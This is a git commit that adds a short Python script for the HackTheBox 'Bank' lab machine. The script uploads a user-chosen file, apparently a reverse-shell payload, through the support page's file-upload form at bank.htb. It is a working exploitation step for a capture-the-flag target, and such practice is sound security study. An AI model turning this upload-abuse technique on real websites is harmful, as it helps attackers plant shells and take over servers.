79b30646e1fc243922abbc1e68bebcdfc4a9daa6
0xd4y <77868212+0xd4y@users.noreply.github.com>
2021-02-21 19:59:21 -0600

    Create bank_upload.py

---
+++ HackTheBox/bank_upload.py
@@ -0,0 +1,17 @@
+#!/usr/bin/env python3
+
+## Created by 0xd4y
+## Script made for uploading scripts for exploting Bank on HackTheBox
+
+import requests
+
+file_input = input("Please specify the path to the file you'd like to use: ")
+reverse = open(file_input,"rb")
+url = "http://bank.htb/support.php"
+data = {"submitadd":"submit"}
+
+upload = requests.post(url, files= {"fileToUpload":reverse}, allow_redirects=False, data=data)
+if ("successfully" in upload.text):
+    print("Upload completed successfully!")
+else:
+    print("Something went wrong!")
